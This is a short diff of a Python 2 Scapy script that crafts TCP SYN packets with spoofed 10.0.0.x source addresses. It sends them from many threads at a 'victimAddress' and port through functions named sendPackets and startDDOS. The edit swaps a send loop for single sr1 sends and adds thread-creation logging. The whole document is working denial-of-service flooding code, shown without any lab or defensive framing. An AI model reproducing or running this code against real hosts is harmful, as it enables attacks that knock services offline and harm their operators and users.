@@ -9,12 +9,14 @@ def sendPackets(victimAddress,victimPort):
         #raw = str(createRandomString())
         raw = "stuff"
         packetSYN=IP(src="10.0.0." + str(i), dst=victimAddress,id=1111,ttl=99)/TCP(sport=RandShort(),dport=victimPort,seq=12345,ack=1000,window=1000,flags="S")/raw
-        print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
-        ans,unans=srloop(packetSYN,inter=0.1,retry=2,timeout=4)
+        #print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
+        #ans,unans=srloop(packetSYN,inter=0.1,retry=2,timeout=4)
+        sr1(packetSYN)
 
 
 def startDDOS(victimAddress,victimPort,numThreads):
     for i in range(1,numThreads):
+        print "Creating thread: %s" % i
         thread = Thread(target=sendPackets,args=(victimAddress,victimPort))
         thread.start()
 
